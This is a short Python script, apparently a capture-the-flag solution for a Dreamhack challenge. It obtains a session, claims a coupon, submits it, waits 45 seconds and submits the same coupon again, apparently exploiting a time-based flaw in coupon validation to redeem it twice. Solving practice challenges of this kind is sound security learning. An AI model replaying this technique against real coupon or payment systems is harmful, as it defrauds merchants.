from httpx import AsyncClient
from asyncio import run
from time import sleep

async def main():
  async with AsyncClient(base_url='http://host3.dreamhack.games:18346') as c:
    session: str = (await c.get("/session")).raise_for_status().json()["session"]
    coupon: str = (await c.get("/coupon/claim", headers={
      "Authorization": session
    })).raise_for_status().json()["coupon"]
    _ = await c.get('/coupon/submit', headers={
      "Authorization": session,
      "coupon": coupon
    })
    print("start")
    sleep(45)
    print("real start")
    print((await c.get('/coupon/submit', headers={"Authorization": session, "coupon": coupon})).raise_for_status().json()) # pyright: ignore[reportAny]

run(main())

